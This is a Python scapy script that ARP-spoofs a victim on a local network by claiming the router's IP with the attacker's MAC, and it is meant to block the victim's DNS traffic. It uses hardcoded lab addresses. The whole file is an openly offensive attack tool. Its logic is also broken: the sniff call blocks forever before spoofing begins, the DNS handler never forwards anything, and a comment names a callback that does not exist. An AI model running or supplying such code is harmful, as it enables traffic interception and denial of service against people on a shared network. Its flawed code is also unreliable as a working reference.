#!/usr/bin/env python3

from scapy.all import Ether
from scapy.all import ARP
from scapy.all import IP
from scapy.all import UDP
from scapy.all import DNS
from scapy.all import DNSQR
from scapy.all import sendp
from scapy.all import sniff
from scapy.all import conf

from time import sleep

from multiprocessing import Process

# Turn off scapy verbose messages
conf.verb = 0

def spoof(target_ip, router_ip, target_mac, attacker_mac):
	# Creating an Ethernet frame with the appropiate 
	# source and destination headers
	frame  = Ether(src=attacker_mac, dst=target_mac)	

	# Creating an ARP layer with the MAC address of the attacker,
	# the IP address of the router, and the destination IP of the victim machine
	arp    = ARP(hwsrc=attacker_mac, psrc=router_ip, pdst=target_ip, op=2)

	# Using scapy's layering to layer the ARP layer on top 
	# of the Ethernet layer
	packet = frame/arp

	while True:
		sendp(packet, verbose=False)
		sleep(1)

def spoof_process(*args):
	p = Process(
		target=spoof,
		args=(*args,),
		daemon=True
	)
	p.start()
	p.join()

def dos_dns(pkt):
	if pkt.haslayer(DNS):
		return
	else:
		sendp(pkt)

if __name__ == '__main__':

	target_mac   = "00:0C:29:EF:6A:70"
	attacker_mac = "00:0C:29:74:09:54"
	target_ip    = "192.168.33.130"
	router_ip    = "192.168.33.2"

	# Sniff for all DNS packets and forward to the
	# callback function, ```handle_dns_request```
	sniff(iface="eth0", count=0, filter="udp and dst port 53", prn=dos_dns)


	# Start seperate process that will our MAC address
	# with the router's IP address
	spoof_process(target_ip, router_ip, target_mac, attacker_mac)

